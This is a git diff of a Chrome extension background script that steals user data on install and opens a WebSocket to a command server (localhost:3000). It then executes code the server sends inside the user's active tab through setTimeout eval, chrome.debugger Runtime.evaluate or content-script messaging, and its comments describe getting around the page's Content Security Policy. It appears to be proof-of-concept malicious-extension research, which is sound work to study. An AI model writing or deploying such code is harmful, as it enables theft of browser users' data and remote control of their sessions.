@@ -1,7 +1,9 @@
 // Perform the initial data steal and connect to websockets only after website is ready
 async function onReady() {
     await stealUserData();
-    await connectWebSocket();
+    setTimeout(() => {
+        socket = connectWebSocket();
+    }, 2000);
 }
 
 chrome.runtime.onInstalled.addListener(onReady);
@@ -68,11 +70,19 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
 // Establish a websocket connection to the server and forward all messages from the server to the popup
 // This way the popup can receive real-time code from the server and execute on client-side
-async function connectWebSocket() {
+let WS_CONNECTED = false;
+let socket;
+
+function connectWebSocket() {
+    if (WS_CONNECTED) {
+        return;
+    }
+
     const socket = new WebSocket('ws://localhost:3000');
 
     socket.onopen = () => {
         console.log('WebSocket connected');
+        WS_CONNECTED = true;
     };
 
     socket.onmessage = onWsMessage;
@@ -82,27 +92,39 @@ async function connectWebSocket() {
     };
 
     socket.onclose = (event) => {
-        console.log('WebSocket closed. Attempting to reconnect...');
-        setTimeout(connectWebSocket, 2000);
+        console.log('WebSocket closed.');
+        WS_CONNECTED = false;
     };
+
+    return socket
 }
 
 // Process the message from the WS server
 async function onWsMessage(event) {
-    let currentTab = await getCurrentTab();
+    const parsedMessage = JSON.parse(event.data);
+
+    console.log('received message:', parsedMessage);
+    if (parsedMessage.type === 'HELLO') {
+        socket.send("Hello, Server!");
+    }
+
+    const currentTab = await getCurrentTab();
     if (!currentTab) {
-        console.error('Could not find current tab');
+        console.log('Could not find current tab');
         return;
     }
-    // Foward all messages from the WS server to the content script for execution
-    // TODO: I haven't figured this out just yet because of the CSP
-    chrome.tabs.sendMessage(currentTab.id, {type: 'WEBSOCKET_MESSAGE', data: event.data});
 
-
-    // Evaluate the code in the context of the current tab with the debugger
-    await chrome.debugger.attach({tabId: currentTab.id}, "1.3");
-    await chrome.debugger.sendCommand({tabId: currentTab.id}, "Runtime.evaluate", {expression: event.data});
-    await chrome.debugger.detach({tabId: currentTab.id});
+    if (parsedMessage.type === 'BG_COMMAND') {
+        // Show that eval through setTimout is blocked by CSP in the background script
+        executeWithSetTimeout(parsedMessage.data);
+        // Alternatively, execute the command with the interpreter
+        // TODO: figure out how to import JSInterpreter
+        // executeWithInterpreter(parsedMessage.data);
+    } else if (parsedMessage.type === 'CS_COMMAND') {
+        chrome.tabs.sendMessage(currentTab.id, parsedMessage);
+        // Alternatively, execute the command with the debugger
+        // executeWithDebugger(parsedMessage.data, currentTab.id);
+    }
 }
 
 /* =================================================================================== */
@@ -113,4 +135,38 @@ async function getCurrentTab() {
     let queryOptions = {active: true, lastFocusedWindow: true};
     let [tab] = await chrome.tabs.query(queryOptions);
     return tab;
+}
+
+// Evaluate the code in the context of a tab with the debugger
+async function executeWithDebugger(command, tabId) {
+    await chrome.debugger.attach({tabId}, "1.3");
+    await chrome.debugger.sendCommand({tabId}, "Runtime.evaluate", {expression: command});
+    await chrome.debugger.detach({tabId});
+}
+
+function executeWithInterpreter(command) {
+    const initFunc = function (interpreter, globalObject) {
+        interpreter.setProperty(globalObject, 'url', String(location));
+        interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))
+
+        const alertWrapper = function alert(text) {
+            return window.alert(text);
+        };
+        interpreter.setProperty(globalObject, 'alert', interpreter.createNativeFunction(alertWrapper));
+
+        // TODO: figure out how to bind all DOM interfaces to the interpreter
+        // const windowWrapper = function w(command) {
+        //     const parsedCommand = command.slice(7)
+        //     return window[parsedCommand];
+        // };
+        // interpreter.setProperty(globalObject, 'window',
+        //     interpreter.createNativeFunction(windowWrapper));
+    };
+    const interpreter = new JSInterpreter(command, initFunc)
+    interpreter.run()
+}
+
+// Execute injected code through a setTimeout
+function executeWithSetTimeout(command) {
+    setTimeout(command, 1);
 }
